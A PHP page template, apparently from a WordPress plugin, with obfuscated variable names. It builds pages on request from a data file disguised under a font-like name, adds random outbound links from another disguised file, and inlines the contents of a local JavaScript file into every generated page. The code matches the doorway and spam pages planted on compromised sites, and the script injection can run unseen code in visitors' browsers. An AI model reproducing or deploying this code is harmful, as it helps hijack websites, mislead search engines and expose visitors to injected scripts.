<?php
$qHpn6FV = intval(get_query_var('gxyscd'));

if ($qHpn6FV < 1 || $qHpn6FV > 5481) return;
$hrh23mto = file(plugin_dir_path(__FILE__).'titles-fonts.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$hfovV90re = explode(';', $hrh23mto[$qHpn6FV]);
if (count($hfovV90re) < 2) return;
$mMLSjV1 = $hfovV90re[0];
$k29qt  = $hfovV90re[1];
$rjS7ji6 = $hfovV90re[2];
$jugaRVs  = $hfovV90re[3];
$xR0Q9WXFO5 = $hfovV90re[4];
set_query_var('maiipydqgj', $mMLSjV1);

$k0Wz1kqp = '';
$ys1LWcs = plugin_dir_path(__FILE__).'location-reusable.php';
if (is_file($ys1LWcs)) {
	$aMCKJK9 = file($ys1LWcs, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($aMCKJK9);
	shuffle($aMCKJK9);
	$cOkCwTEeqv = mt_rand(2, 5);
	if (count($aMCKJK9) > $cOkCwTEeqv) {
		for ($bOXBqYG = 0; $bOXBqYG < $cOkCwTEeqv; $bOXBqYG++) {
			$lpMDbmh = array_shift($aMCKJK9);
			$k0Wz1kqp .= '<p><a href="'.$lpMDbmh.'">'.$lpMDbmh.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $mMLSjV1; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $k29qt . "</p>\n";
				if (strlen($jugaRVs) > 0) echo "<p>" . $jugaRVs . "</p>\n";
				if (strlen($rjS7ji6) > 0) echo "<p>" . $rjS7ji6 . "</p>\n";
				if (strlen($xR0Q9WXFO5) > 0) echo '<p><a href="#"><img src="'.$xR0Q9WXFO5.'"></a>' . "</p>\n";
				echo $k0Wz1kqp;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$ajGMm54q = plugin_dir_path(__FILE__) . 'products-plugin.js';
if (is_file($ajGMm54q)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($ajGMm54q);
	echo '</script>';
}
get_footer();
?>
